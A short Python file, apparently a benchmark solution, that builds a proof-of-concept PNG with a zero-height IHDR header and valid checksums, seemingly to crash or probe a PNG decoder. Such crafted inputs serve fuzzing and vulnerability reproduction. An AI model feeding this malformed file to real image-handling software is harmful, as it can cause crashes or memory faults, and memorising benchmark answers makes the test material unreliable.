import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        signature = b'\x89PNG\r\n\x1a\n'
        width = b'\x00\x00\x00\x01'
        height = b'\x00\x00\x00\x00'
        bit_depth = b'\x08'
        color_type = b'\x00'
        comp_method = b'\x00'
        filt_method = b'\x00'
        interlace = b'\x00'
        ihdr_data = width + height + bit_depth + color_type + comp_method + filt_method + interlace
        ihdr_type = b'IHDR'
        ihdr_crc_data = ihdr_type + ihdr_data
        ihdr_crc = zlib.crc32(ihdr_crc_data).to_bytes(4, 'big')
        ihdr_len = (13).to_bytes(4, 'big')
        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc
        pixel_data = b'\x00'
        compressed = zlib.compress(pixel_data)
        idat_type = b'IDAT'
        idat_crc_data = idat_type + compressed
        idat_crc = zlib.crc32(idat_crc_data).to_bytes(4, 'big')
        idat_len = len(compressed).to_bytes(4, 'big')
        idat_chunk = idat_len + idat_type + compressed + idat_crc
        iend_type = b'IEND'
        iend_data = b''
        iend_crc_data = iend_type + iend_data
        iend_crc = zlib.crc32(iend_crc_data).to_bytes(4, 'big')
        iend_len = (0).to_bytes(4, 'big')
        iend_chunk = iend_len + iend_type + iend_data + iend_crc
        poc = signature + ihdr_chunk + idat_chunk + iend_chunk
        return poc